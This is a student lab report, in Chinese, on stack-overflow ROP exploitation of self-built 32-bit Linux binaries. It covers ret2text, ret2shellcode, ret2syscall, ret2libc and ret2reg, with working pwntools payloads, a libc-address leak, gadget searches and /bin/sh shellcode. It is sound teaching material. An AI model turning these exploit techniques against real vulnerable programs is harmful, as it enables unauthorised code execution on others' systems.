# 软件安全实验 2A：基于栈溢出的 ROP 利用

| 项目 | 内容 |
|---|---|
| 姓名 | 占智博 |
| 学号 | 202618018629010 |
| 实验 | 实验 2A（栈溢出与 ROP） |
| 完成日期 | 2026-11-27 |
| 代码仓库 | <https://github.com/zzb040506/EX2A-ROP> |

---

## 1. 实验目的

本实验从 32 位 Linux ELF 程序的栈溢出出发，完成从“覆盖返回地址”到“构造完整 ROP 链”的递进练习，具体目标如下：

1. 理解 ELF 文件结构、程序的装入过程与虚拟内存布局，理解 `.text`、`.plt`、`.got`、`.bss`、栈等区域在利用中的作用。
2. 理解 32 位 x86 的 `cdecl` 调用约定、`call/ret`、`leave` 指令与栈帧的形成过程，能够根据反汇编推导溢出偏移。
3. 理解编译链接期防护机制 NX、PIE、Canary、RELRO 的原理与开关方式，能够在题目中识别并绕开它们。
4. 复现课堂讲授的 4 类 ROP：ret2text、ret2shellcode、ret2syscall、ret2libc（含 ret2libc1/2/3 三个变体），共 6 个 basic ROP 案例。
5. 自选中级 ROP 专题 **ret2reg**，完成“无需泄漏地址、借寄存器跳转执行 shellcode”的原理分析与不少于 4 页的 writeup，并给出两种 gadget 变体的可复现实现。

---

## 2. 实验环境与复现方式

### 2.1 运行环境

实验主机为 Apple Silicon Mac（arm64），无法直接执行 i386 程序，因此采用如下分层环境：

| 层次 | 组件 | 说明 |
|---|---|---|
| 宿主 | macOS (Apple Silicon) | 开发与文档 |
| 虚拟机 | colima | 提供 x86_64 Linux 虚拟机 |
| 容器 | Docker + `ubuntu:20.04` 镜像 | 统一编译与运行环境 |
| 运行时 | qemu-user（binfmt） | 在 x86_64 容器内执行 32 位 i386 程序 |

镜像中安装 `gcc-multilib`（提供 `-m32` 与 `/lib32`）、`pwntools`、`binutils`、`file` 等工具。所有编译与利用均在容器内完成，宿主机只负责编辑文件。

### 2.2 一键复现

```bash
# 构建镜像并进入容器（源码目录挂载到 /work）
bash scripts/docker_run.sh

# 容器内：编译 7 个靶程序（6 个 basic ROP + 1 个中级 ret2reg），并复制 32 位 libc 供 ret2libc3 使用
bash scripts/build_all.sh

# 容器内：逐个运行利用脚本的自动验证模式
bash scripts/run_all.sh
```

`scripts/run_all.sh` 会对每个案例执行 `python3 exp.py --check`，全部成功时输出 `[+] 全部利用成功` 并返回 0。本次实验的实际运行结果如下：

```
[ret2text] PASS  backdoor=0x80491f6
[ret2shellcode] PASS  buf=0x40800cd0
[ret2syscall] PASS  pop3=0x8058418 xor_ecx_int80=0x804a78f binsh=0x80e5068 argv=0x80e5070
[ret2libc1] PASS  system@plt=0x80490b4 binsh=0x804c028
[ret2libc2] PASS  gets@plt=0x8049094 pop_ebx=0x8049022 system@plt=0x80490b4 target=0x804c060
[ret2libc3] PASS  write=0x3fecc830 libc_base=0x3fddc000 system=0x3fe1d360 binsh=0x3ff68363
[ret2reg:push esp;ret] PASS  gadget=0x80b10d8
[ret2reg:call eax] PASS  gadget=0x804901d
[ret2reg] PASS  ret_esp=0x80b10d8 call_eax=0x804901d
[+] 全部利用成功
```

> 说明：ret2shellcode 与 ret2libc3 的地址每次运行都会变化（ASLR），上表是其中一次运行的结果；脚本会动态计算，不依赖固定数值。

### 2.3 统一编译参数

`challenges/Makefile` 对全部题目使用同一组基础参数：

```make
CC      ?= gcc
BASE    := -m32 -O0 -fno-stack-protector -fno-builtin -no-pie -mpreferred-stack-boundary=2
```

| 参数 | 作用 |
|---|---|
| `-m32` | 生成 32 位程序，栈传参、指针 4 字节，便于手工构造链 |
| `-O0` | 关闭优化，栈帧规整，偏移稳定 |
| `-fno-stack-protector` | 关闭 Canary，突出每一题要考察的防护层次 |
| `-fno-builtin` | 防止 `gets` 被内建替换或优化 |
| `-no-pie` | 关闭 PIE，代码段与 `.bss` 地址固定 |
| `-mpreferred-stack-boundary=2` | 关闭 16 字节栈对齐，避免编译器在缓冲区后插入填充 |

此外按题目需要追加：

- ret2shellcode：`-z execstack`，使栈可执行；
- ret2syscall：`-static`，把 libc 静态链入，保证 gadget 与 `int 0x80` 都落在同一文件内；
- ret2reg（中级专题）：`-static -z execstack`，静态链接提供 `push esp; ret` / `call eax` 等 gadget，栈可执行用于放置 shellcode。

---

## 3. 背景原理

### 3.1 ELF 与进程装入

ELF 可执行文件由 ELF 头、程序头表（Program Header Table）和若干段（Segment）组成。程序头表中的 `PT_LOAD` 段告诉内核“把文件的哪一段映射到虚拟地址的哪个位置、用什么权限”。典型的 32 位非 PIE 程序布局如下：

```
0x08048000  .text（代码，r-x）
0x08049xxx  .plt / .plt.sec（延迟绑定跳板，r-x）
0x0804axxx  .rodata（只读数据，r--）
0x0804bxxx  .got / .got.plt（全局偏移表，rw-）
0x0804cxxx  .data / .bss（可写数据，rw-）
0xf7xxx000  libc.so.6（共享库，ASLR 随机）
0xffxxxxxx  栈（ASLR 随机，rw-）
```

几个区域在本实验中反复出现：

- `.plt`：过程链接表。`write@plt`、`system@plt` 是可直接 `ret` 过去的代码地址，用于在不知道 libc 基址时调用库函数。
- `.got`：全局偏移表。第一次调用后，GOT 表项中存放库函数的**真实地址**，因此 `write@got` 是绝佳的泄漏目标。
- `.bss`：未初始化全局变量区，可写且地址固定（非 PIE），适合存放 `/bin/sh` 或第二阶段的链。
- 栈：函数调用时由 `call` 压入返回地址，`ret` 弹出并跳转。覆盖栈上的返回地址即可劫持控制流。

作为对照，Windows 下的 PE（Portable Executable）在结构上与 ELF 一一对应，但术语和细节不同。两者的对应关系如下表，可以看出“栈溢出 + 覆盖返回地址”这一漏洞机理与文件格式无关，差别只在于利用时复用的代码载体：

| 概念 | ELF（Linux） | PE（Windows） |
|---|---|---|
| 文件头 | ELF Header（`e_ident` 魔数 `\x7fELF`） | DOS 头 + `IMAGE_NT_HEADERS`（`MZ` / `PE\0\0`） |
| 段/节描述 | Program Header（`PT_LOAD`）、Section Header | Section Table（`.text` / `.rdata` / `.data` / `.idata`） |
| 导入表 | `.got.plt` + 动态链接器延迟绑定 | `.idata` 导入表（IAT），由加载器一次性填充 |
| 导出表 | 动态符号表（`.dynsym`） | `.edata` 导出表 |
| 地址无关 | PIE（`-pie`） | ASLR + `/DYNAMICBASE`，重定位表 `.reloc` |
| 栈保护 | Canary（`-fstack-protector`） | `/GS`（security cookie） |
| 数据执行保护 | NX（`-z noexecstack`） | DEP（`/NXCOMPAT`） |
| 典型利用 | ret2plt / ret2libc / ROP | ret2IAT / 虚拟保护绕过 / ROP |

本实验在 Linux 上完成，但第 3.3、3.4 节讨论的“覆盖返回地址 → 复用已有指令片段”思路同样适用于 PE：Windows 上把 ELF 的 `ret2libc` 换成“调用 IAT 中已导入的 `WinExec`/`VirtualProtect`”，把 gadget 搜索对象换成 `kernel32.dll`/`ntdll.dll` 即可。二者唯一的实质差异是 PE 的栈帧通常包含 `/GS` cookie 与 SEH 异常处理链，因而额外的绕过点更多。

### 3.2 32 位栈帧与溢出偏移

以本实验的靶程序为例，`main` 的典型序言为：

```asm
push ebp
mov  ebp, esp
push ebx                 ; 保存 ebx（PIC 代码需要）
sub  esp, 0x64
lea  eax, [ebp-0x68]     ; buf 的首地址
```

`char buf[100]` 位于 `ebp-0x68`，由此可以画出栈帧：

```
高地址
        +------------------+
ebp+8   | argc / argv ...  |
ebp+4   | 返回地址 ret     |  <-- 溢出目标
ebp+0   | 保存的 ebp       |  <-- offset 104
ebp-4   | 保存的 ebx       |  <-- offset 100
ebp-5   | buf[99]          |
  ...   | ...              |
ebp-0x68| buf[0]           |  <-- 写入起点
        +------------------+
低地址
```

因此从 `buf` 起点到各关键位置的距离为：

- 到 saved ebx：100 字节；
- 到 saved ebp：104 字节；
- 到返回地址：**108 字节**。

全部利用脚本统一取 `OFFSET = 108`：先写 108 字节填充，再写目标地址。这一点已通过“直接把返回地址改成后门函数”的实验验证（见 4.1）。

### 3.3 `call`、`ret` 与 `leave`

- `call f` 等价于 `push 返回地址; jmp f`；
- `ret` 等价于 `pop eip`，即从当前 `esp` 处取出 4 字节作为下一条指令地址；
- `leave` 等价于 `mov esp, ebp; pop ebp`，常用于函数尾声恢复栈帧。

函数返回时执行 `leave; ret`，`esp` 恰好指向返回地址槽。只要控制该槽的内容，就能让程序“返回”到任意地址——这就是 ret2xxx 系列利用的起点。

### 3.4 编译链接期防护机制

| 机制 | 原理 | 关闭方式 | 绕过思路 |
|---|---|---|---|
| NX / DEP | 数据页不可执行，栈上的 shellcode 无法运行 | `-z execstack` | 不执行栈，改为复用已有代码（ROP） |
| PIE | 代码段基址随机化，符号地址不固定 | `-no-pie` | 泄漏代码地址计算基址 |
| Canary | 返回地址前插入随机值，函数返回前校验 | `-fno-stack-protector` | 泄漏 canary、覆盖 TLS 中的值或爆破 |
| RELRO | 收紧 GOT 的写权限 | 默认 Partial | Full RELRO 下 GOT 只读，但仍可读 GOT 做泄漏 |

本实验的策略是**每道题只保留需要考察的那一层防护**：所有题目关闭 Canary 与 PIE，ret2text/ret2libc 系列开启 NX，ret2shellcode 关闭 NX（`-z execstack`），ret2syscall 静态链接以提供完整 gadget。

### 3.5 各题保护机制实测

使用 pwntools 的 `ELF` 属性读取各二进制的保护状态：

| 题目 | PIE | NX | Canary | RELRO | 可执行栈 | 关键符号/地址 |
|---|---|---|---|---|---|---|
| ret2text | 关 | 开 | 关 | Partial | 否 | `get_shell=0x80491f6` |
| ret2shellcode | 关 | **关** | 关 | Partial | **是** | 运行时打印 `buf` |
| ret2syscall | 关 | 开 | 关（主体） | Partial | 否 | `binsh=0x80e5068`、`argv_arr=0x80e5070` |
| ret2libc1 | 关 | 开 | 关 | Partial | 否 | `system@plt=0x80490b4`、`binsh=0x804c028` |
| ret2libc2 | 关 | 开 | 关 | Partial | 否 | `gets@plt=0x8049094`、`target=0x804c060` |
| ret2libc3 | 关 | 开 | 关 | Partial | 否 | 仅 `write@plt/got`、`main` |

> 注：ret2syscall 静态链接了完整的 glibc，`checksec` 会在库代码中发现 canary 符号并报告 Canary 开启；但 `main` 本身由 `-fno-stack-protector` 编译，栈帧中没有 canary，不影响溢出。

---

## 4. 逐题分析与利用

### 4.1 ret2text：返回到程序自带后门

**题目要点**：`main` 使用 `gets(buf)` 读取输入且不检查长度，程序内自带：

```c
void get_shell(void) { system("/bin/sh"); }
```

NX 开启，但存在现成的后门函数，目标只是把返回地址改成 `get_shell`。

**利用**：`get_shell` 的地址为 `0x80491f6`，偏移 108。

```python
payload = b"A" * 108 + p32(0x80491f6)
```

**结果**：

```
[ret2text] PASS  backdoor=0x80491f6
```

**说明**：这是最基础的“控制流劫持”。它验证了偏移 108 的正确性，也是后续所有题目的基础。

---

### 4.2 ret2shellcode：执行栈上的 shellcode

**题目要点**：程序主动打印栈缓冲区地址：

```c
printf("buf address: %p\n", (void *)buf);
gets(buf);
```

编译时加了 `-z execstack`，栈可执行。由于 PIE 关闭但栈地址仍受 ASLR 影响，程序打印的 `buf` 地址正好省去了爆破。

**利用**：把 `shellcraft.i386.linux.sh()` 生成的 shellcode 放在缓冲区开头，用 NOP 填充到偏移 108，再把返回地址写成 `buf` 的地址。

```python
shellcode = asm(shellcraft.i386.linux.sh())
payload   = shellcode.ljust(108, b"\x90") + p32(buf_addr)
```

**结果**（`buf` 每次运行不同）：

```
[ret2shellcode] PASS  buf=0x40800cd0
```

**说明**：本题与 NX 的关系最直接——一旦栈不可执行，同样的 payload 会在执行 shellcode 时触发 SIGSEGV，必须改用 ROP。

---

### 4.3 ret2syscall：用 gadget 直接触发 `execve`

**题目要点**：静态链接，程序中虽然有 `/bin/sh` 字符串，但没有 `system@plt`。目标是不依赖任何库函数，直接用 `int 0x80` 执行系统调用：

```c
execve("/bin/sh", NULL, NULL);
```

32 位 Linux 的系统调用号与寄存器约定：

| 寄存器 | 含义 |
|---|---|
| `eax` | 系统调用号，`execve = 11` |
| `ebx` | 第一个参数，`path = "/bin/sh"` |
| `ecx` | 第二个参数，`argv` |
| `edx` | 第三个参数，`envp` |

**gadget 搜索**：静态二进制中 pwntools 的 ROP 数据集并不完整（曾出现找不到 `mov ecx, eax` 的情况），因此改为在可执行段中按机器码字节搜索，这样跳过去后 CPU 必然按该字节序列解码：

| gadget | 机器码 | 地址 |
|---|---|---|
| `pop eax; pop edx; pop ebx; ret` | `58 5a 5b c3` | `0x8058418` |
| `xor ecx, ecx; int 0x80` | `31 c9 cd 80` | `0x804a78f` |

静态二进制中没有 `pop ecx; ret`（`59 c3`），所以用 `xor ecx, ecx` 把 `ecx` 置 0，相当于 `argv = NULL`。Linux 允许 `execve` 的 `argv` 为 NULL，实测可以正常起 shell。

**链结构**：

```
pop3; 11; 0; binsh; xor_ecx_int80
      ^eax ^edx ^ebx
```

执行过程：`pop3` 依次弹出 `eax=11`、`edx=0`、`ebx=binsh`，随后 `xor ecx,ecx; int 0x80` 触发 `execve("/bin/sh", NULL, NULL)`。

**结果**：

```
[ret2syscall] PASS  pop3=0x8058418 xor_ecx_int80=0x804a78f binsh=0x80e5068 argv=0x80e5070
```

**说明**：本题展示了 ROP 的本质——把程序已有的指令片段（gadget）拼接成任意逻辑。即使没有 `pop ecx`，也可以用语义等价的 `xor ecx, ecx` 达成目的。

---

### 4.4 ret2libc1：`system@plt("/bin/sh")`

**题目要点**：程序内有 `system@plt`，也有全局字符串 `binsh`：

```c
char binsh[] = "/bin/sh";
```

**利用**：32 位 `cdecl` 通过栈传参。`ret` 到 `system@plt` 时，栈顶依次应是“返回地址”和“第一个参数”，因此：

```python
payload = b"A" * 108
        + p32(system_plt)   # 返回地址 -> system
        + p32(0xDEADBEEF)   # system 的返回地址（随便填）
        + p32(binsh)        # system 的参数
```

**结果**：

```
[ret2libc1] PASS  system@plt=0x80490b4 binsh=0x804c028
```

---

### 4.5 ret2libc2：先用 `gets` 写入 `/bin/sh`

**题目要点**：有 `system@plt`，但程序中没有 `/bin/sh` 字符串，只有一个可写的全局数组：

```c
char target[100];   // .bss，地址固定
```

**思路**：分两步，先调用 `gets(target)` 把 `/bin/sh` 写进 `.bss`，再调用 `system(target)`。

这里有一个容易出错的细节：`gets` 是 `cdecl` 函数，返回后需要由调用方清理栈上的参数。如果直接写成：

```python
p32(gets_plt) + p32(target) + p32(system_plt) + ...
```

`gets` 返回后会返回到 `target` 的地址（被当作返回地址），链就断了。正确做法是在 `gets` 之后插入一个 `pop ebx; ret`，把参数弹掉：

```python
pop_ebx = ROP(elf).find_gadget(["pop ebx", "ret"]).address
chain = (
    p32(gets_plt) + p32(pop_ebx) + p32(target) +   # gets(target)，返回后弹出参数
    p32(system_plt) + p32(0xDEADBEEF) + p32(target)  # system(target)
)
```

发送 payload 后再补一行 `/bin/sh` 供 `gets` 读取。

**结果**：

```
[ret2libc2] PASS  gets@plt=0x8049094 pop_ebx=0x8049022 system@plt=0x80490b4 target=0x804c060
```

---

### 4.6 ret2libc3：泄漏 libc 基址的两阶段利用

**题目要点**：既没有 `system@plt`，也没有 `/bin/sh`，只有 `write@plt` 与 `gets`。开启了 ASLR，libc 每次加载的基址都不同。

它属于 CTF-wiki 的 **basic ROP**（ret2libc 系列）中的最后一题，也是本实验从“有现成函数可用”过渡到“需要信息泄漏”的关键一步。运行结果：

```
[ret2libc3] PASS  write=0x3fecc830 libc_base=0x3fddc000 system=0x3fe1d360 binsh=0x3ff68363
```

#### 4.6.1 题目描述与难点

靶程序源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char buf[100];
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("=== ret2libc3 ===");
    write(1, "input:\n", 7);
    gets(buf);
    puts("done.");
    return 0;
}
```

编译参数：`-m32 -O0 -fno-stack-protector -fno-builtin -no-pie -mpreferred-stack-boundary=2`。

难点有三个：

1. **没有 `system@plt`**：程序从未调用 `system`，PLT 中没有对应表项，不能直接 `ret` 过去；
2. **没有 `/bin/sh` 字符串**：无法像 ret2libc1 那样直接传参；
3. **ASLR 开启**：libc 基址随机，`system` 与 `/bin/sh` 的真实地址每次运行都不同，必须动态计算。

可用的条件是：程序调用了 `write`，因此存在 `write@plt`，并且 `write` 在 GOT 中的表项会在第一次调用后填入真实地址。

#### 4.6.2 泄漏原理

`write` 的函数原型为：

```c
ssize_t write(int fd, const void *buf, size_t count);
```

如果我们能让程序执行 `write(1, write@got, 4)`，它就会把 `write` 在内存中的真实地址（4 字节）输出到标准输出。拿到这个地址后：

```
libc_base = write_real - libc.symbols["write"]
system    = libc_base + libc.symbols["system"]
binsh     = libc_base + offset_of("/bin/sh")
```

这里的 `libc.symbols["write"]` 与 `/bin/sh` 的偏移来自**与靶程序运行环境完全一致的 libc 文件**。实验中由 `scripts/build_all.sh` 从容器内 `/lib32/libc.so.6` 复制到 `challenges/ret2libc3/libc.so.6`，保证偏移匹配。

#### 4.6.3 第一阶段：泄漏并返回 main

利用偏移 108 覆盖返回地址，构造如下链：

```
write@plt | main | 1 | write@got | 4
```

对应的栈布局（`ret` 进入 `write@plt` 时）：

| 位置 | 内容 | 含义 |
|---|---|---|
| `esp` | `main` | `write` 的返回地址，执行完回到 `main` 再来一轮 |
| `esp+4` | `1` | `fd = stdout` |
| `esp+8` | `write@got` | 要输出的缓冲区 |
| `esp+12` | `4` | 输出 4 字节 |

代码：

```python
def build_stage1(elf):
    return b"".join([
        p32(elf.plt["write"]),
        p32(elf.symbols["main"]),   # 返回 main，准备第二阶段
        p32(1),                     # fd
        p32(elf.got["write"]),      # buf
        p32(4),                     # count
    ])
```

#### 4.6.4 读取泄漏值时的一个坑

程序的执行顺序是：`gets(buf)` → `puts("done.")` → `main` 返回 → `write(1, write@got, 4)`。

也就是说，标准输出上先出现 `done.\n`，**之后**才是 4 字节泄漏。如果直接 `recvn(4)`，读到的会是 `done` 的 `d o n e` 四个字节，计算出的 libc 基址完全错误。因此必须先消费掉 `done.\n`：

```python
p.recvuntil(b"done.\n")
leak = p.recvn(4)
write_addr = int.from_bytes(leak, "little")
```

这是本实验调试过程中实际踩到的坑，修正后一次通过。

#### 4.6.5 第二阶段：计算并再次利用

```python
libc = ELF("./libc.so.6", checksec=False)
libc_base  = write_addr - libc.symbols["write"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr  = libc_base + next(libc.search(b"/bin/sh\x00"))

p.recvuntil(b"input:")           # 等待 main 重新打印提示
payload2 = b"A" * 108 + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr)
p.sendline(payload2)
```

第二阶段与 ret2libc1 完全相同，只是 `system` 与 `/bin/sh` 的地址换成了运行时计算值。

#### 4.6.6 完整脚本

```python
def main() -> int:
    elf  = ELF(BINARY, checksec=False)
    libc = ELF(LIBC, checksec=False)

    p = process(BINARY)
    p.recvuntil(b"input:")
    p.sendline(b"A" * OFFSET + build_stage1(elf))

    p.recvuntil(b"done.\n")
    leak = p.recvn(4)
    write_addr = int.from_bytes(leak, "little")

    libc_base  = write_addr - libc.symbols["write"]
    system_addr = libc_base + libc.symbols["system"]
    binsh_addr  = libc_base + next(libc.search(b"/bin/sh\x00"))

    p.recvuntil(b"input:")
    p.sendline(b"A" * OFFSET + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr))
```

#### 4.6.7 运行结果与分析

```
[ret2libc3] PASS  write=0x3fecc830 libc_base=0x3fddc000 system=0x3fe1d360 binsh=0x3ff68363
```

- `write` 的真实地址为 `0x3fecc830`，减去 libc 中的 `write` 偏移得到基址 `0x3fddc000`（页对齐，符合加载器按页映射的规律）；
- `system = 0x3fddc000 + 0x40360 = 0x3fe1d360`；
- `/bin/sh` 位于 `0x3ff68363`；
- 第二次发送 payload 后成功拿到 shell，`id` 输出包含 `uid=`。

#### 4.6.8 本题的启示

1. **泄漏是 ASLR 的天敌**：只要程序能把某个已解析库函数的真实地址输出出来，整个 libc 的布局就都已知了。
2. **GOT 是可读的**：即使 Full RELRO 把 GOT 设为只读，也只是不能写，读取仍然允许；因此 ret2libc 类泄漏在 Full RELRO 下依然有效。
3. **返回 `main` 实现多阶段**：一次溢出只能写有限字节，返回 `main` 可以重新获得一次输入机会，把一次利用拆成多轮。
4. **libc 必须匹配**：本地实验用容器内的 `/lib32/libc.so.6`；真实 CTF 中通常用题目提供的 libc，或用 libc-database 按低 12 位反查版本。

至此，CTF-wiki 的 6 个 basic ROP 案例全部复现完毕。但 basic ROP 的共同前提是**知道要跳转的确切地址**（后门函数、buf 地址、gadget、libc 符号）。当缓冲区地址随机且程序不泄漏任何地址时，就需要进入中级 ROP，下一章给出本实验选做的中级专题。

---

## 5. 中级 ROP 专题 writeup：ret2reg

> 对应 CTF-wiki“中级 ROP（medium-rop）”中的 **ret2reg**：把返回地址指向一条 `jmp reg` / `call reg` 类指令，借助寄存器中已经指向缓冲区的值完成跳转，从而**不需要知道栈或缓冲区的绝对地址**。

### 5.1 为什么选择 ret2reg 作为中级专题

CTF-wiki 把中级 ROP 概括为 ret2csu、ret2reg、JOP、COP、BROP 等几类，它们的共同特征是**在 basic ROP 的“直接跳到已知地址”之外，额外解决一个问题**：

| 技术 | 要解决的问题 | 依赖条件 |
|---|---|---|
| ret2csu | 找不到 `pop rdi; pop rsi; ...; ret` 时如何给函数传参 | `__libc_csu_init` 中的通用 gadget |
| **ret2reg** | **缓冲区地址未知（ASLR / 不打印地址）时如何跳到自己的数据** | 某个寄存器恰好指向缓冲区 |
| JOP | 没有以 `ret` 结尾的 gadget 时如何串起执行流 | `jmp reg` 风格的 dispatch gadget |
| COP | 只允许 `call` 的场景 | `call reg` 链 |
| BROP | 二进制不可得（blind） | 可反复重启的服务 + 栈溢出 |

选择 ret2reg 的理由是：它正好补上本实验前 6 题的空缺。ret2shellcode（4.2）虽然也执行栈上代码，但脚本必须先从输出中拿到 `buf` 的地址；而 ret2reg **一行地址泄漏都不需要**，它利用的是“函数返回值本来就指向缓冲区”这一编译器行为，在开启 ASLR 且程序不打印任何地址时依然稳定。它同时用到寄存器、gadget 字节搜索和 shellcode，是承上启下的一题。

### 5.2 题目设计与防护配置

靶程序 `challenges/ret2reg/src.c`：

```c
#include <stdio.h>

void vuln(void) {
    char buf[100];
    gets(buf);
}

int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("=== ret2reg ===");
    puts("input:");
    vuln();
    puts("done.");
    return 0;
}
```

编译参数在统一参数基础上再加两项：

```make
ret2reg/ret2reg: ret2reg/src.c
	$(CC) $(BASE) -static -z execstack -o $@ $<
```

- `-static`：把 libc 静态链接进来，得到一个约 700 KB 的二进制，里面有足够多的 `push esp; ret` / `call eax` 字节序列；配合 `-no-pie` 让代码地址固定。
- `-z execstack`：栈可执行，shellcode 才能放在 `buf` 里运行。
- Canary、PIE 均关闭，ASLR 保持系统默认开启。

这里有一个容易误判的点：`checksec` 对这个静态二进制会报告 `Canary found`。这是**误报**——静态链接把 libc 中的 `__stack_chk_fail` 一起带进来了，而 checksec 只按符号名判断。查看 `vuln` 的反汇编即可确认函数序言中没有 `mov eax, gs:0x14` 一类的 cookie 读写：

```asm
08049df5 <vuln>:
 8049df9:  55                    push   ebp
 8049dfa:  89 e5                 mov    ebp,esp
 8049dfc:  53                    push   ebx
 8049dfd:  83 ec 64              sub    esp,0x64
 8049e0a:  8d 55 98              lea    edx,[ebp-0x68]   ; buf
 8049e0d:  52                    push   edx
 8049e10:  e8 cb 7d 00 00        call   8051be0 <_IO_gets>
 8049e15:  83 c4 04              add    esp,0x4
 8049e19:  8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
 8049e1c:  c9                    leave
 8049e1d:  c3                    ret
```

### 5.3 核心原理：让寄存器替我们“报地址”

`gets` 的返回值是读到的字符串首地址，也就是 `buf`；在 cdecl 调用约定下返回值放在 `eax`。上面的反汇编显示，`gets` 返回后只执行了 `add esp,4`、`nop`、`mov ebx,[ebp-4]`、`leave`、`ret`，**没有任何指令改写 `eax`**，因此执行到 `ret` 时：

```
eax = buf 的地址
esp = 指向返回地址槽（payload 的第 109~112 字节）
```

于是有两条不需要栈地址的路径：

1. 返回地址改成 `jmp eax` / `call eax`：直接跳到 `buf` 开头执行 shellcode；
2. 返回地址改成 `jmp esp` / `push esp; ret`：此时 `esp` 正指向返回地址之后的位置，只要 shellcode 紧跟返回地址，就会落到 shellcode 上。

这就是 ret2reg 的本质：**不“知道”地址，而是让寄存器在运行时把地址送过来**。

与 4.2 的 ret2shellcode 对比：

| | ret2shellcode | ret2reg |
|---|---|---|
| 是否需要泄漏 | 需要，脚本先 `recv` 出 buf 地址 | 不需要 |
| 返回地址写什么 | `buf` 的绝对地址 | gadget 地址（`jmp/call/push` 寄存器） |
| ASLR 影响 | 栈地址随机 → 必须泄漏 | 栈地址随机也无所谓 |
| 对程序的要求 | 打印 buf 地址 | 某个寄存器在 `ret` 前指向 buf |

### 5.4 栈布局与偏移实测

`buf` 位于 `ebp-0x68`（即 `ebp-104`），`push ebx` 又让栈帧多出 4 字节保存区，因此栈布局为：

```
高地址
        +------------------+
ebp+8   | 调用者参数   ...  |
ebp+4   | 返回地址          |  <-- offset 108，溢出目标
ebp+0   | saved ebp         |  <-- offset 104
ebp-4   | saved ebx         |  <-- offset 100
ebp-8   | 填充 / 对齐       |  <-- offset 96..99（buf 声明 100 字节）
  ...   | buf               |
ebp-0x68| buf[0]            |  <-- 写入起点
        +------------------+
低地址
```

因此 `OFFSET = 108`：100 字节 `buf` + 4 字节对齐填充 + 4 字节 saved ebx + 4 字节 saved ebp。脚本中统一写成：

```python
OFFSET = 108  # buf[100] + saved ebx(4) + saved ebp(4)
```

需要注意：payload 覆盖了 saved ebx，函数尾声的 `mov ebx,[ebp-4]` 会把 `ebx` 恢复成 `0x41414141`。本利用在 `ret` 之后立刻进入 gadget 与 shellcode，不再执行依赖 `ebx` 的 PIC 代码，所以不影响结果；但如果 gadget 之后还要返回 libc 函数，就必须注意 `ebx` 已被破坏（这是静态链接 + `-mpreferred-stack-boundary=2` 带来的额外约束）。

### 5.5 gadget 搜索：为什么不能硬编码，以及 0x0a 的坑

不同环境下编译出的地址不同，脚本因此**在运行时从 ELF 的可执行段中按机器码搜索 gadget**，而不是写死地址：

```python
def search_all(elf, pattern):
    hits = []
    for seg in elf.segments:
        if seg.header.p_type != "PT_LOAD" or not (seg.header.p_flags & 1):
            continue                      # 只搜可执行段
        data = elf.read(seg.header.p_vaddr, seg.header.p_filesz)
        idx = data.find(pattern)
        while idx != -1:
            addr = seg.header.p_vaddr + idx
            if b"\n" not in p32(addr) and b"\r" not in p32(addr):
                hits.append(addr)          # 过滤地址中含换行的命中
            idx = data.find(pattern, idx + 1)
    return hits
```

这里有一个本实验实际踩到的坑。`gets` 以换行符结束读取，payload 通过管道发送时末尾必须是 `\n`；如果 gadget 地址的 4 个字节里含有 `0x0a`，`gets` 会在读到该字节时提前结束，返回地址只被覆盖了一部分，利用必然失败。

最初按 `push esp; ret`（机器码 `54 c3`）搜到的第一个命中是 `0x080b070a`，其小端表示为 `0a 07 0b 08`——首字节就是 `0x0a`：

```
>>> search_all(elf, b"\x54\xc3")
[0x80b070a, 0x80b10d8]
```

第一版脚本没有过滤，结果是 `[ret2reg:push esp;ret] FAIL gadget=0x80b070a`。加入 `\n`/`\r` 过滤后取到第二个命中 `0x080b10d8`（小端 `d8 10 0b 08`，无换行），通过。

gadget 搜索的实测结果如下（均已过滤掉含换行的地址）：

| 机器码 | 指令 | 命中地址 | 本实验是否可用 |
|---|---|---|---|
| `54 c3` | `push esp; ret` | `0x080b070a`（含 0x0a） / `0x080b10d8` | 用后者 |
| `ff e4` | `jmp esp` | 无 | 不存在，故回退到 `push esp;ret` |
| `ff d0` | `call eax` | `0x0804901d` 等 | 用 |
| `ff e0` | `jmp eax` | `0x080533bb` 等 | 备选 |
| `ff e1` | `jmp ecx` | `0x0804f6be` 等 | 未使用 |

注意 `jmp esp`（`ff e4`）在这个二进制中**完全不存在**，这正是脚本采用“优先 `jmp esp`、否则回退 `push esp; ret`”双分支的原因：`push esp` 把当前 `esp` 压栈，紧接着的 `ret` 又把这个值弹回 `eip`，效果等价于 `jmp esp`，只是多消耗 4 字节栈空间，不影响利用。

### 5.6 变体一：`push esp; ret` → shellcode

payload 结构：

```
[ 108 字节填充 ][ gadget 地址 ][ shellcode ]
                 ↑ 返回地址    ↑ esp 在 ret 后正好指向这里
```

代码：

```python
def payload_ret_esp(elf):
    gadget = find_bytes(elf, b"\xff\xe4") if search_all(elf, b"\xff\xe4") \
        else find_bytes(elf, b"\x54\xc3")
    shellcode = asm(shellcraft.i386.linux.sh())   # 44 字节
    return b"A" * OFFSET + p32(gadget) + shellcode, gadget
```

执行时序：

1. `vuln` 的 `ret` 弹出 gadget 地址，`esp` 上移 4 字节，指向 shellcode 首字节；
2. `push esp` 把这个“指向 shellcode 的指针”压栈，`esp` 下移 4；
3. `ret` 弹出该指针作为 `eip`，CPU 从 shellcode 首字节开始执行；
4. shellcode 执行 `execve("/bin/sh", 0, 0)`，拿到 shell。

本实验中该变体实测：

```
[ret2reg:push esp;ret] PASS  gadget=0x80b10d8
```

### 5.7 变体二：`call eax` → shellcode

`call eax` 等价于 `push 下一条指令地址; jmp eax`，它会把 shellcode 的**返回地址**压栈，因此 shellcode 必须放在 `buf` 开头，gadget 放在返回地址处：

```
[ shellcode ][ 90 90 ... 填充到 108 字节 ][ call eax 地址 ]
```

代码：

```python
def payload_call_eax(elf):
    gadget = find_bytes(elf, b"\xff\xd0")   # call eax
    shellcode = asm(shellcraft.i386.linux.sh())
    return shellcode.ljust(OFFSET, b"\x90") + p32(gadget), gadget
```

